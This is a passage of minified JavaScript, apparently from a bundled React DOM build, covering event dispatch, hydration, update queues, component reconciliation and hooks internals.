l(a,u,null,n,i),o.push({event:a,listeners:c}))}}if(!(7&t)){if(l="mouseout"===e||"pointerout"===e,(!(a="mouseover"===e||"pointerover"===e)||n===Kp||!(u=n.relatedTarget||n.fromElement)||!Ss(u)&&!u[qr])&&(l||a)&&(a=i.window===i?i:(a=i.ownerDocument)?a.defaultView||a.parentWindow:window,l?(l=r,null!==(u=(u=n.relatedTarget||n.toElement)?Ss(u):null)&&(u!==(h=Qs(u))||5!==u.tag&&6!==u.tag)&&(u=null)):(l=null,u=r),l!==u)){if(c=e1,m="onMouseLeave",d="onMouseEnter",p="mouse",("pointerout"===e||"pointerover"===e)&&(c=n1,m="onPointerLeave",d="onPointerEnter",p="pointer"),h=null==l?a:Do(l),f=null==u?a:Do(u),(a=new c(m,p+"leave",l,n,i)).target=h,a.relatedTarget=f,m=null,Ss(i)===r&&((c=new c(d,p+"enter",u,n,i)).target=f,c.relatedTarget=h,m=c),h=m,l&&u)e:{for(d=u,p=0,f=c=l;f;f=mo(f))p++;for(f=0,m=d;m;m=mo(m))f++;for(;0<p-f;)c=mo(c),p--;for(;0<f-p;)d=mo(d),f--;for(;p--;){if(c===d||null!==d&&c===d.alternate)break e;c=mo(c),d=mo(d)}c=null}else c=null;null!==l&&f1(o,a,l,c,!1),null!==u&&null!==h&&f1(o,h,u,c,!0)}if("select"===(l=(a=r?Do(r):window).nodeName&&a.nodeName.toLowerCase())||"input"===l&&"file"===a.type)var g=SR;else if(s1(a))if(H_)g=xR;else{g=ER;var y=_R}else(l=a.nodeName)&&"input"===l.toLowerCase()&&("checkbox"===a.type||"radio"===a.type)&&(g=TR);switch(g&&(g=g(e,r))?G_(o,g,n,i):(y&&y(e,a,r),"focusout"===e&&(y=a._wrapperState)&&y.controlled&&"number"===a.type&&qp(a,"number",a.value)),y=r?Do(r):window,e){case"focusin":(s1(y)||"true"===y.contentEditable)&&(Io=y,nm=r,vl=null);break;case"focusout":vl=nm=Io=null;break;case"mousedown":rm=!0;break;case"contextmenu":case"mouseup":case"dragend":rm=!1,c1(o,n,i);break;case"selectionchange":if(DR)break;case"keydown":case"keyup":c1(o,n,i)}var v;if(jg)e:{switch(e){case"compositionstart":var w="onCompositionStart";break e;case"compositionend":w="onCompositionEnd";break e;case"compositionupdate":w="onCompositionUpdate";break e}w=void 0}else xo?Y_(e,n)&&(w="onCompositionEnd"):"keydown"===e&&229===n.keyCode&&(w="onCompositionStart");w&&(q_&&"ko"!==n.locale&&(xo||"onCompositionStart"!==w?"onCompositionEnd"===w&&xo&&(v=j_()):(Ug="value"in(gi=i)?gi.value:gi.textContent,xo=!0)),0<(y=gh(r,w)).length&&(w=new t1(w,e,null,n,i),o.push({event:w,listeners:y}),v?w.data=v:null!==(v=W_(n))&&(w.data=v))),(v=mR?gR(e,n):yR(e,n))&&(0<(r=gh(r,"onBeforeInput")).length&&(i=new t1("onBeforeInput","beforeinput",null,n,i),o.push({event:i,listeners:r}),i.data=v))}iE(o,t)}))}function Bl(e,t,n){return{instance:e,listener:t,currentTarget:n}}function gh(e,t){for(var n=t+"Capture",r=[];null!==e;){var i=e,s=i.stateNode;5===i.tag&&null!==s&&(i=s,null!=(s=Pl(e,n))&&r.unshift(Bl(e,s,i)),null!=(s=Pl(e,t))&&r.push(Bl(e,s,i))),e=e.return}return r}function mo(e){if(null===e)return null;do{e=e.return}while(e&&5!==e.tag);return e||null}function f1(e,t,n,r,i){for(var s=t._reactName,o=[];null!==n&&n!==r;){var a=n,l=a.alternate,u=a.stateNode;if(null!==l&&l===r)break;5===a.tag&&null!==u&&(a=u,i?null!=(l=Pl(n,s))&&o.unshift(Bl(n,l,a)):i||null!=(l=Pl(n,s))&&o.push(Bl(n,l,a))),n=n.return}0!==o.length&&e.push({event:t,listeners:o})}var RR=/\r\n?/g,AR=/\u0000|\uFFFD/g;function p1(e){return("string"==typeof e?e:""+e).replace(RR,"\n").replace(AR,"")}function wc(e,t,n){if(t=p1(t),p1(e)!==t&&n)throw Error(U(425))}function yh(){}var im=null,sm=null;function om(e,t){return"textarea"===e||"noscript"===e||"string"==typeof t.children||"number"==typeof t.children||"object"==typeof t.dangerouslySetInnerHTML&&null!==t.dangerouslySetInnerHTML&&null!=t.dangerouslySetInnerHTML.__html}var am="function"==typeof setTimeout?setTimeout:void 0,bR="function"==typeof clearTimeout?clearTimeout:void 0,m1="function"==typeof Promise?Promise:void 0,OR="function"==typeof queueMicrotask?queueMicrotask:typeof m1<"u"?function(e){return m1.resolve(null).then(e).catch(PR)}:am;function PR(e){setTimeout((function(){throw e}))}function Zf(e,t){var n=t,r=0;do{var i=n.nextSibling;if(e.removeChild(n),i&&8===i.nodeType)if("/$"===(n=i.data)){if(0===r)return e.removeChild(i),void Fl(t);r--}else"$"!==n&&"$?"!==n&&"$!"!==n||r++;n=i}while(n);Fl(t)}function xi(e){for(;null!=e;e=e.nextSibling){var t=e.nodeType;if(1===t||3===t)break;if(8===t){if("$"===(t=e.data)||"$!"===t||"$?"===t)break;if("/$"===t)return null}}return e}function g1(e){e=e.previousSibling;for(var t=0;e;){if(8===e.nodeType){var n=e.data;if("$"===n||"$!"===n||"$?"===n){if(0===t)return e;t--}else"/$"===n&&t++}e=e.previousSibling}return null}var va=Math.random().toString(36).slice(2),hr="__reactFiber$"+va,jl="__reactProps$"+va,qr="__reactContainer$"+va,lm="__reactEvents$"+va,$R="__reactListeners$"+va,LR="__reactHandles$"+va;function Ss(e){var t=e[hr];if(t)return t;for(var n=e.parentNode;n;){if(t=n[qr]||n[hr]){if(n=t.alternate,null!==t.child||null!==n&&null!==n.child)for(e=g1(e);null!==e;){if(n=e[hr])return n;e=g1(e)}return t}n=(e=n).parentNode}return null}function Su(e){return!(e=e[hr]||e[qr])||5!==e.tag&&6!==e.tag&&13!==e.tag&&3!==e.tag?null:e}function Do(e){if(5===e.tag||6===e.tag)return e.stateNode;throw Error(U(33))}function pd(e){return e[jl]||null}var um=[],Co=-1;function Wi(e){return{current:e}}function Ge(e){0>Co||(e.current=um[Co],um[Co]=null,Co--)}function ze(e,t){Co++,um[Co]=e.current,e.current=t}var bi={},sn=Wi(bi),Tn=Wi(!1),As=bi;function Ko(e,t){var n=e.type.contextTypes;if(!n)return bi;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var i,s={};for(i in n)s[i]=t[i];return r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=s),s}function xn(e){return null!=(e=e.childContextTypes)}function vh(){Ge(Tn),Ge(sn)}function y1(e,t,n){if(sn.current!==bi)throw Error(U(168));ze(sn,t),ze(Tn,n)}function oE(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,"function"!=typeof r.getChildContext)return n;for(var i in r=r.getChildContext())if(!(i in t))throw Error(U(108,_M(e)||"Unknown",i));return st({},n,r)}function wh(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||bi,As=sn.current,ze(sn,e),ze(Tn,Tn.current),!0}function v1(e,t,n){var r=e.stateNode;if(!r)throw Error(U(169));n?(e=oE(e,t,As),r.__reactInternalMemoizedMergedChildContext=e,Ge(Tn),Ge(sn),ze(sn,e)):Ge(Tn),ze(Tn,n)}var Or=null,md=!1,ep=!1;function aE(e){null===Or?Or=[e]:Or.push(e)}function FR(e){md=!0,aE(e)}function Gi(){if(!ep&&null!==Or){ep=!0;var e=0,t=be;try{var n=Or;for(be=1;e<n.length;e++){var r=n[e];do{r=r(!0)}while(null!==r)}Or=null,md=!1}catch(t){throw null!==Or&&(Or=Or.slice(e+1)),A_($g,Gi),t}finally{be=t,ep=!1}}return null}var No=[],Mo=0,Sh=null,_h=0,Fn=[],Vn=0,bs=null,Pr=1,$r="";function us(e,t){No[Mo++]=_h,No[Mo++]=Sh,Sh=e,_h=t}function lE(e,t,n){Fn[Vn++]=Pr,Fn[Vn++]=$r,Fn[Vn++]=bs,bs=e;var r=Pr;e=$r;var i=32-tr(r)-1;r&=~(1<<i),n+=1;var s=32-tr(t)+i;if(30<s){var o=i-i%5;s=(r&(1<<o)-1).toString(32),r>>=o,i-=o,Pr=1<<32-tr(t)+i|n<<i|r,$r=s+e}else Pr=1<<s|n<<i|r,$r=e}function Yg(e){null!==e.return&&(us(e,1),lE(e,1,0))}function Wg(e){for(;e===Sh;)Sh=No[--Mo],No[Mo]=null,_h=No[--Mo],No[Mo]=null;for(;e===bs;)bs=Fn[--Vn],Fn[Vn]=null,$r=Fn[--Vn],Fn[Vn]=null,Pr=Fn[--Vn],Fn[Vn]=null}var Nn=null,Cn=null,Xe=!1,Zn=null;function uE(e,t){var n=zn(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,null===(t=e.deletions)?(e.deletions=[n],e.flags|=16):t.push(n)}function w1(e,t){switch(e.tag){case 5:var n=e.type;return null!==(t=1!==t.nodeType||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t)&&(e.stateNode=t,Nn=e,Cn=xi(t.firstChild),!0);case 6:return null!==(t=""===e.pendingProps||3!==t.nodeType?null:t)&&(e.stateNode=t,Nn=e,Cn=null,!0);case 13:return null!==(t=8!==t.nodeType?null:t)&&(n=null!==bs?{id:Pr,overflow:$r}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},(n=zn(18,null,null,0)).stateNode=t,n.return=e,e.child=n,Nn=e,Cn=null,!0);default:return!1}}function cm(e){return 0!=(1&e.mode)&&0==(128&e.flags)}function hm(e){if(Xe){var t=Cn;if(t){var n=t;if(!w1(e,t)){if(cm(e))throw Error(U(418));t=xi(n.nextSibling);var r=Nn;t&&w1(e,t)?uE(r,n):(e.flags=-4097&e.flags|2,Xe=!1,Nn=e)}}else{if(cm(e))throw Error(U(418));e.flags=-4097&e.flags|2,Xe=!1,Nn=e}}}function S1(e){for(e=e.return;null!==e&&5!==e.tag&&3!==e.tag&&13!==e.tag;)e=e.return;Nn=e}function Sc(e){if(e!==Nn)return!1;if(!Xe)return S1(e),Xe=!0,!1;var t;if((t=3!==e.tag)&&!(t=5!==e.tag)&&(t="head"!==(t=e.type)&&"body"!==t&&!om(e.type,e.memoizedProps)),t&&(t=Cn)){if(cm(e))throw cE(),Error(U(418));for(;t;)uE(e,t),t=xi(t.nextSibling)}if(S1(e),13===e.tag){if(!(e=null!==(e=e.memoizedState)?e.dehydrated:null))throw Error(U(317));e:{for(e=e.nextSibling,t=0;e;){if(8===e.nodeType){var n=e.data;if("/$"===n){if(0===t){Cn=xi(e.nextSibling);break e}t--}else"$"!==n&&"$!"!==n&&"$?"!==n||t++}e=e.nextSibling}Cn=null}}else Cn=Nn?xi(e.stateNode.nextSibling):null;return!0}function cE(){for(var e=Cn;e;)e=xi(e.nextSibling)}function Qo(){Cn=Nn=null,Xe=!1}function Gg(e){null===Zn?Zn=[e]:Zn.push(e)}var VR=Qr.ReactCurrentBatchConfig;function Xn(e,t){if(e&&e.defaultProps){for(var n in t=st({},t),e=e.defaultProps)void 0===t[n]&&(t[n]=e[n]);return t}return t}var Eh=Wi(null),Th=null,Ro=null,Hg=null;function Kg(){Hg=Ro=Th=null}function Qg(e){var t=Eh.current;Ge(Eh),e._currentValue=t}function dm(e,t,n){for(;null!==e;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,null!==r&&(r.childLanes|=t)):null!==r&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function zo(e,t){Th=e,Hg=Ro=null,null!==(e=e.dependencies)&&null!==e.firstContext&&(e.lanes&t&&(vn=!0),e.firstContext=null)}function qn(e){var t=e._currentValue;if(Hg!==e)if(e={context:e,memoizedValue:t,next:null},null===Ro){if(null===Th)throw Error(U(308));Ro=e,Th.dependencies={lanes:0,firstContext:e}}else Ro=Ro.next=e;return t}var _s=null;function Xg(e){null===_s?_s=[e]:_s.push(e)}function hE(e,t,n,r){var i=t.interleaved;return null===i?(n.next=n,Xg(t)):(n.next=i.next,i.next=n),t.interleaved=n,Yr(e,r)}function Yr(e,t){e.lanes|=t;var n=e.alternate;for(null!==n&&(n.lanes|=t),n=e,e=e.return;null!==e;)e.childLanes|=t,null!==(n=e.alternate)&&(n.childLanes|=t),n=e,e=e.return;return 3===n.tag?n.stateNode:null}var hi=!1;function Jg(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function dE(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Ur(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function Ii(e,t,n){var r=e.updateQueue;if(null===r)return null;if(r=r.shared,2&Ie){var i=r.pending;return null===i?t.next=t:(t.next=i.next,i.next=t),r.pending=t,Yr(e,n)}return null===(i=r.interleaved)?(t.next=t,Xg(r)):(t.next=i.next,i.next=t),r.interleaved=t,Yr(e,n)}function Gc(e,t,n){if(null!==(t=t.updateQueue)&&(t=t.shared,0!=(4194240&n))){var r=t.lanes;n|=r&=e.pendingLanes,t.lanes=n,Lg(e,n)}}function _1(e,t){var n=e.updateQueue,r=e.alternate;if(null!==r&&n===(r=r.updateQueue)){var i=null,s=null;if(null!==(n=n.firstBaseUpdate)){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};null===s?i=s=o:s=s.next=o,n=n.next}while(null!==n);null===s?i=s=t:s=s.next=t}else i=s=t;return n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},void(e.updateQueue=n)}null===(e=n.lastBaseUpdate)?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function xh(e,t,n,r){var i=e.updateQueue;hi=!1;var s=i.firstBaseUpdate,o=i.lastBaseUpdate,a=i.shared.pending;if(null!==a){i.shared.pending=null;var l=a,u=l.next;l.next=null,null===o?s=u:o.next=u,o=l;var c=e.alternate;null!==c&&((a=(c=c.updateQueue).lastBaseUpdate)!==o&&(null===a?c.firstBaseUpdate=u:a.next=u,c.lastBaseUpdate=l))}if(null!==s){var h=i.baseState;for(o=0,c=u=l=null,a=s;;){var d=a.lane,f=a.eventTime;if((r&d)===d){null!==c&&(c=c.next={eventTime:f,lane:0,tag:a.tag,payload:a.payload,callback:a.callback,next:null});e:{var p=e,m=a;switch(d=t,f=n,m.tag){case 1:if("function"==typeof(p=m.payload)){h=p.call(f,h,d);break e}h=p;break e;case 3:p.flags=-65537&p.flags|128;case 0:if(null==(d="function"==typeof(p=m.payload)?p.call(f,h,d):p))break e;h=st({},h,d);break e;case 2:hi=!0}}null!==a.callback&&0!==a.lane&&(e.flags|=64,null===(d=i.effects)?i.effects=[a]:d.push(a))}else f={eventTime:f,lane:d,tag:a.tag,payload:a.payload,callback:a.callback,next:null},null===c?(u=c=f,l=h):c=c.next=f,o|=d;if(null===(a=a.next)){if(null===(a=i.shared.pending))break;a=(d=a).next,d.next=null,i.lastBaseUpdate=d,i.shared.pending=null}}if(null===c&&(l=h),i.baseState=l,i.firstBaseUpdate=u,i.lastBaseUpdate=c,null!==(t=i.shared.interleaved)){i=t;do{o|=i.lane,i=i.next}while(i!==t)}else null===s&&(i.shared.lanes=0);Ps|=o,e.lanes=o,e.memoizedState=h}}function E1(e,t,n){if(e=t.effects,t.effects=null,null!==e)for(t=0;t<e.length;t++){var r=e[t],i=r.callback;if(null!==i){if(r.callback=null,r=n,"function"!=typeof i)throw Error(U(191,i));i.call(r)}}}var fE=(new h_.Component).refs;function fm(e,t,n,r){n=null==(n=n(r,t=e.memoizedState))?t:st({},t,n),e.memoizedState=n,0===e.lanes&&(e.updateQueue.baseState=n)}var gd={isMounted:function(e){return!!(e=e._reactInternals)&&Qs(e)===e},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=hn(),i=Di(e),s=Ur(r,i);s.payload=t,null!=n&&(s.callback=n),null!==(t=Ii(e,s,i))&&(nr(t,e,i,r),Gc(t,e,i))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=hn(),i=Di(e),s=Ur(r,i);s.tag=1,s.payload=t,null!=n&&(s.callback=n),null!==(t=Ii(e,s,i))&&(nr(t,e,i,r),Gc(t,e,i))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=hn(),r=Di(e),i=Ur(n,r);i.tag=2,null!=t&&(i.callback=t),null!==(t=Ii(e,i,r))&&(nr(t,e,r,n),Gc(t,e,r))}};function T1(e,t,n,r,i,s,o){return"function"==typeof(e=e.stateNode).shouldComponentUpdate?e.shouldComponentUpdate(r,s,o):!t.prototype||!t.prototype.isPureReactComponent||(!Ul(n,r)||!Ul(i,s))}function pE(e,t,n){var r=!1,i=bi,s=t.contextType;return"object"==typeof s&&null!==s?s=qn(s):(i=xn(t)?As:sn.current,s=(r=null!=(r=t.contextTypes))?Ko(e,i):bi),t=new t(n,s),e.memoizedState=null!==t.state&&void 0!==t.state?t.state:null,t.updater=gd,e.stateNode=t,t._reactInternals=e,r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=i,e.__reactInternalMemoizedMaskedChildContext=s),t}function x1(e,t,n,r){e=t.state,"function"==typeof t.componentWillReceiveProps&&t.componentWillReceiveProps(n,r),"function"==typeof t.UNSAFE_componentWillReceiveProps&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&gd.enqueueReplaceState(t,t.state,null)}function pm(e,t,n,r){var i=e.stateNode;i.props=n,i.state=e.memoizedState,i.refs=fE,Jg(e);var s=t.contextType;"object"==typeof s&&null!==s?i.context=qn(s):(s=xn(t)?As:sn.current,i.context=Ko(e,s)),i.state=e.memoizedState,"function"==typeof(s=t.getDerivedStateFromProps)&&(fm(e,t,s,n),i.state=e.memoizedState),"function"==typeof t.getDerivedStateFromProps||"function"==typeof i.getSnapshotBeforeUpdate||"function"!=typeof i.UNSAFE_componentWillMount&&"function"!=typeof i.componentWillMount||(t=i.state,"function"==typeof i.componentWillMount&&i.componentWillMount(),"function"==typeof i.UNSAFE_componentWillMount&&i.UNSAFE_componentWillMount(),t!==i.state&&gd.enqueueReplaceState(i,i.state,null),xh(e,n,i,r),i.state=e.memoizedState),"function"==typeof i.componentDidMount&&(e.flags|=4194308)}function qa(e,t,n){if(null!==(e=n.ref)&&"function"!=typeof e&&"object"!=typeof e){if(n._owner){if(n=n._owner){if(1!==n.tag)throw Error(U(309));var r=n.stateNode}if(!r)throw Error(U(147,e));var i=r,s=""+e;return null!==t&&null!==t.ref&&"function"==typeof t.ref&&t.ref._stringRef===s?t.ref:((t=function(e){var t=i.refs;t===fE&&(t=i.refs={}),null===e?delete t[s]:t[s]=e})._stringRef=s,t)}if("string"!=typeof e)throw Error(U(284));if(!n._owner)throw Error(U(290,e))}return e}function _c(e,t){throw e=Object.prototype.toString.call(t),Error(U(31,"[object Object]"===e?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function I1(e){return(0,e._init)(e._payload)}function mE(e){function t(t,n){if(e){var r=t.deletions;null===r?(t.deletions=[n],t.flags|=16):r.push(n)}}function n(n,r){if(!e)return null;for(;null!==r;)t(n,r),r=r.sibling;return null}function r(e,t){for(e=new Map;null!==t;)null!==t.key?e.set(t.key,t):e.set(t.index,t),t=t.sibling;return e}function i(e,t){return(e=Ci(e,t)).index=0,e.sibling=null,e}function s(t,n,r){return t.index=r,e?null!==(r=t.alternate)?(r=r.index)<n?(t.flags|=2,n):r:(t.flags|=2,n):(t.flags|=1048576,n)}function o(t){return e&&null===t.alternate&&(t.flags|=2),t}function a(e,t,n,r){return null===t||6!==t.tag?((t=ap(n,e.mode,r)).return=e,t):((t=i(t,n)).return=e,t)}function l(e,t,n,r){var s=n.type;return s===To?c(e,t,n.props.children,r,n.key):null!==t&&(t.elementType===s||"object"==typeof s&&null!==s&&s.$$typeof===ci&&I1(s)===t.type)?((r=i(t,n.props)).ref=qa(e,t,n),r.return=e,r):((r=Zc(n.type,n.key,n.props,null,e.mode,r)).ref=qa(e,t,n),r.return=e,r)}function u(e,t,n,r){return null===t||4!==t.tag||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?((t=lp(n,e.mode,r)).return=e,t):((t=i(t,n.children||[])).return=e,t)}function c(e,t,n,r,s){return null===t||7!==t.tag?((t=Ns(n,e.mode,r,s)).return=e,t):((t=i(t,n)).return=e,t)}function h(e,t,n){if("string"==typeof t&&""!==t||"number"==typeof t)return(t=ap(""+t,e.mode,n)).return=e,t;if("object"==typeof t&&null!==t){switch(t.$$typeof){case cc:return(n=Zc(t.type,t.key,t.props,null,e.mode,n)).ref=qa(e,null,t),n.return=e,n;case Eo:return(t=lp(t,e.mode,n)).return=e,t;case ci:return h(e,(0,t._init)(t._payload),n)}if(il(t)||Va(t))return(t=Ns(t,e.mode,n,null)).return=e,t;_c(e,t)}return null}function d(e,t,n,r){var i=null!==t?t.key:null;if("string"==typeof n&&""!==n||"number"==typeof n)return null!==i?null:a(e,t,""+n,r);if("object"==typeof n&&null!==n){switch(n.$$typeof){case cc:return n.key===i?l(e,t,n,r):null;case Eo:return n.key===i?u(e,t,n,r):null;case ci:return d(e,t,(i=n._init)(n._payload),r)}if(il(n)||Va(n))return null!==i?null:c(e,t,n,r,null);_c(e,n)}return null}function f(e,t,n,r,i){if("string"==typeof r&&""!==r||"number"==typeof r)return a(t,e=e.get(n)||null,""+r,i);if("object"==typeof r&&null!==r){switch(r.$$typeof){case cc:return l(t,e=e.get(null===r.key?n:r.key)||null,r,i);case Eo:return u(t,e=e.get(null===r.key?n:r.key)||null,r,i);case ci:return f(e,t,n,(0,r._init)(r._payload),i)}if(il(r)||Va(r))return c(t,e=e.get(n)||null,r,i,null);_c(t,r)}return null}return function a(l,u,c,p){if("object"==typeof c&&null!==c&&c.type===To&&null===c.key&&(c=c.props.children),"object"==typeof c&&null!==c){switch(c.$$typeof){case cc:e:{for(var m=c.key,g=u;null!==g;){if(g.key===m){if((m=c.type)===To){if(7===g.tag){n(l,g.sibling),(u=i(g,c.props.children)).return=l,l=u;break e}}else if(g.elementType===m||"object"==typeof m&&null!==m&&m.$$typeof===ci&&I1(m)===g.type){n(l,g.sibling),(u=i(g,c.props)).ref=qa(l,g,c),u.return=l,l=u;break e}n(l,g);break}t(l,g),g=g.sibling}c.type===To?((u=Ns(c.props.children,l.mode,p,c.key)).return=l,l=u):((p=Zc(c.type,c.key,c.props,null,l.mode,p)).ref=qa(l,u,c),p.return=l,l=p)}return o(l);case Eo:e:{for(g=c.key;null!==u;){if(u.key===g){if(4===u.tag&&u.stateNode.containerInfo===c.containerInfo&&u.stateNode.implementation===c.implementation){n(l,u.sibling),(u=i(u,c.children||[])).return=l,l=u;break e}n(l,u);break}t(l,u),u=u.sibling}(u=lp(c,l.mode,p)).return=l,l=u}return o(l);case ci:return a(l,u,(g=c._init)(c._payload),p)}if(il(c))return function(i,o,a,l){for(var u=null,c=null,p=o,m=o=0,g=null;null!==p&&m<a.length;m++){p.index>m?(g=p,p=null):g=p.sibling;var y=d(i,p,a[m],l);if(null===y){null===p&&(p=g);break}e&&p&&null===y.alternate&&t(i,p),o=s(y,o,m),null===c?u=y:c.sibling=y,c=y,p=g}if(m===a.length)return n(i,p),Xe&&us(i,m),u;if(null===p){for(;m<a.length;m++)null!==(p=h(i,a[m],l))&&(o=s(p,o,m),null===c?u=p:c.sibling=p,c=p);return Xe&&us(i,m),u}for(p=r(i,p);m<a.length;m++)null!==(g=f(p,i,m,a[m],l))&&(e&&null!==g.alternate&&p.delete(null===g.key?m:g.key),o=s(g,o,m),null===c?u=g:c.sibling=g,c=g);return e&&p.forEach((function(e){return t(i,e)})),Xe&&us(i,m),u}(l,u,c,p);if(Va(c))return function(i,o,a,l){var u=Va(a);if("function"!=typeof u)throw Error(U(150));if(null==(a=u.call(a)))throw Error(U(151));for(var c=u=null,p=o,m=o=0,g=null,y=a.next();null!==p&&!y.done;m++,y=a.next()){p.index>m?(g=p,p=null):g=p.sibling;var v=d(i,p,y.value,l);if(null===v){null===p&&(p=g);break}e&&p&&null===v.alternate&&t(i,p),o=s(v,o,m),null===c?u=v:c.sibling=v,c=v,p=g}if(y.done)return n(i,p),Xe&&us(i,m),u;if(null===p){for(;!y.done;m++,y=a.next())null!==(y=h(i,y.value,l))&&(o=s(y,o,m),null===c?u=y:c.sibling=y,c=y);return Xe&&us(i,m),u}for(p=r(i,p);!y.done;m++,y=a.next())null!==(y=f(p,i,m,y.value,l))&&(e&&null!==y.alternate&&p.delete(null===y.key?m:y.key),o=s(y,o,m),null===c?u=y:c.sibling=y,c=y);return e&&p.forEach((function(e){return t(i,e)})),Xe&&us(i,m),u}(l,u,c,p);_c(l,c)}return"string"==typeof c&&""!==c||"number"==typeof c?(c=""+c,null!==u&&6===u.tag?(n(l,u.sibling),(u=i(u,c)).return=l,l=u):(n(l,u),(u=ap(c,l.mode,p)).return=l,l=u),o(l)):n(l,u)}}var Xo=mE(!0),gE=mE(!1),_u={},yr=Wi(_u),ql=Wi(_u),Yl=Wi(_u);function Es(e){if(e===_u)throw Error(U(174));return e}function Zg(e,t){switch(ze(Yl,t),ze(ql,e),ze(yr,_u),e=t.nodeType){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:Wp(null,"");break;default:t=Wp(t=(e=8===e?t.parentNode:t).namespaceURI||null,e=e.tagName)}Ge(yr),ze(yr,t)}function Jo(){Ge(yr),Ge(ql),Ge(Yl)}function yE(e){Es(Yl.current);var t=Es(yr.current),n=Wp(t,e.type);t!==n&&(ze(ql,e),ze(yr,n))}function ey(e){ql.current===e&&(Ge(yr),Ge(ql))}var rt=Wi(0);function Ih(e){for(var t=e;null!==t;){if(13===t.tag){var n=t.memoizedState;if(null!==n&&(null===(n=n.dehydrated)||"$?"===n.data||"$!"===n.data))return t}else if(19===t.tag&&void 0!==t.memoizedProps.revealOrder){if(128&t.flags)return t}else if(null!==t.child){t.child.return=t,t=t.child;continue}if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var tp=[];function ty(){for(var e=0;e<tp.length;e++)tp[e]._workInProgressVersionPrimary=null;tp.length=0}var Hc=Qr.ReactCurrentDispatcher,np=Qr.ReactCurrentBatchConfig,Os=0,it=null,kt=null,At=null,kh=!1,wl=!1,Wl=0,UR=0;function Jt(){throw Error(U(321))}function ny(e,t){if(null===t)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!rr(e[n],t[n]))return!1;return!0}function ry(e,t,n,r,i,s){if(Os=s,it=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Hc.current=null===e||null===e.memoizedState?qR:YR,e=n(r,i),wl){s=0;do{if(wl=!1,Wl=0,25<=s)throw Error(U(301));s+=1,At=kt=null,t.updateQueue=null,Hc.current=WR,e=n(r,i)}while(wl)}if(Hc.current=Dh,t=null!==kt&&null!==kt.next,Os=0,At=kt=it=null,kh=!1,t)throw Error(U(300));return e}function iy(){var e=0!==Wl;return Wl=0,e}function ur(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return null===At?it.memoizedState=At=e:At=At.next=e,At}function Yn(){if(null===kt){var e=it.alternate;e=null!==e?e.memoizedState:null}else e=kt.next;var t=null===At?it.memoizedState:At.next;if(null!==t)At=t,kt=e;else{if(null===e)throw Error(U(310));e={memoizedState:(kt=e).memoizedState,baseState:kt.baseState,baseQueue:kt.baseQueue,queue:kt.queue,next:null},null===At?it.memoizedState=At=e:At=At.next=e}return At}function Gl(e,t){return"function"==typeof t?t(e):t}function rp(e){var t=Yn(),n=t.queue;if(null===n)throw Error(U(311));n.lastRenderedReducer=e;var r=kt,i=r.baseQueue,s=n.pending;if(null!==s){if(null!==i){var o=i.next;i.next=s.next,s.next=o}r.baseQueue=i=s,n.pending=null}if(null!==i){s=i.next,r=r.baseState;var a=o=null,l=null,u=s;do{var c=u.lane;if((Os&c)===c)null!==l&&(l=l.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),r=u.hasEagerState?u.eagerState:e(r,u.action);else{var h={lane:c,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};null===l?(a=l=h,o=r):l=l.next=h,it.lanes|=c,Ps|=c}u=u.next}while(null!==u&&u!==s);null===l?o=r:l.next=a,rr(r,t.memoizedState)||(vn=!0),t.memoizedState=r,t.baseState=o,t.baseQueue=l,n.lastRenderedState=r}if(null!==(e=n.interleaved)){i=e;do{s=i.lane,it.lanes|=s,Ps|=s,i=i.next}while(i!==e)}else null===i&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function ip(e){var t=Yn(),n=t.queue;if(null===n)throw Error(U(311));n.lastRenderedReducer=e;var r=n.dispatch,i=n.pending,s=t.memoizedState;if(null!==i){n.pending=null;var o=i=i.next;do{s=e(s,o.action),o=o.next}while(o!==i);rr(s,t.memoizedState)||(vn=!0),t.memoizedState=s,null===t.baseQueue&&(t.baseState=s),n.lastRenderedState=s}return[s,r]}function vE(){}function wE(e,t){var n=it,r=Yn(),i=t(),s=!rr(r.memoizedState,i);if(s&&(r.memoizedState=i,vn=!0),r=r.queue,sy(EE.bind(null,n,r,e),[e]),r.getSnapshot!==t||s||null!==At&&1&At.memoizedState.tag){if(n.flags|=2048,Hl(9,_E.bind(null,n,r,i,t),void 0,null),null===Ot)throw Error(U(349));30&Os||SE(n,t,i)}return i}function 